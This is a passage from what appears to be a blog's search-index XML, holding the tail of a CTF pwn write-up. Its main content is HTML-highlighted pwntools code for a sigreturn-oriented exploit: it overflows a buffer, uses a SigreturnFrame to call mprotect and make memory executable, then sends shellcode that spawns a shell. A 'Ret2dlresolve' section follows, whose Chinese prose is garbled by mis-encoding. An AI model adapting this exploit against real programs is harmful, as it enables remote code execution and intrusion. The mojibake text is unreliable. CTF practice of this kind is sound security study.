class="hljs-comment"># p = remote(&#x27;157.245.40.78&#x27;,32071)</span><br>vul = <span class="hljs-number">0x40102E</span><br>syscall_ret = <span class="hljs-number">0x40102B</span> <br><br>fuck = SigreturnFrame()<br>fuck.rax = <span class="hljs-number">10</span><br>fuck.rdi = <span class="hljs-number">0x401000</span><br>fuck.rsi = <span class="hljs-number">0x2000</span><br>fuck.rdx = <span class="hljs-number">7</span><br>fuck.rsp = <span class="hljs-number">0x4010d8</span><br>fuck.rip = syscall_ret<br><br>payload=flat(<br>    [<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x20</span>,<span class="hljs-number">0xdeadbeef</span>,vul,syscall_ret,fuck]<br>)<br>sl(payload)<br>pause()<br>se(<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">15</span>)<br><br>payload=flat(<br>    [<span class="hljs-string">&#x27;wsnd\0&#x27;</span>.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;\0&#x27;</span>),vul,<span class="hljs-number">0x4010f0</span>,asm(shellcraft.sh())] <br>)<br>pause()<br>se(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><hr><h1>Ret2dlresolve</h1><p>å­¦ä¸ä¼šï¼Œæˆæ¶ˆæ„äº†ï¼Œä»¥åè¡¥ä¸Šå§ï¼ˆä½†æ„¿ï¼‰ã€‚run äº† run äº†ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
